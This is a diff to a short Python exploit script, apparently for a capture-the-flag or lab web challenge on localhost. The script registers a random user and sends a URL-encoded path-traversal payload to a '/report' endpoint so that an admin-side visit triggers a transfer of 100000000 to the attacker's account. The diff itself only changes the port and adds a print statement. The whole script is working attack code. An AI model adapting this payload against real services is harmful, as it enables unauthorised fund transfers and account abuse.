@@ -4,7 +4,7 @@ import json, random
 # make a random username
 USERNAME = "".join(list(map(lambda x: random.choice(list("0123456789")),range(0,25))))
 
-URL = "http://localhost:8009"
+URL = "http://localhost:1337"
 
 # register a user and get the token
 r1 = r.post(f"{URL}/register", headers = {
@@ -18,6 +18,7 @@ TOKEN = r1.json()['success']['token']
 r1 = r.post(f"{URL}/report", headers = {
     'Content-Type':'application/json'
     }, data = json.dumps({'path':f'dashboard/%2e%2e%2f%74ransfer%2f{USERNAME}%2f100000000'}))
+print(r1.text)
 
 # Refresh our user token so we have our updated balance in our user session
 r1 = r.get(f"{URL}/refresh",headers={
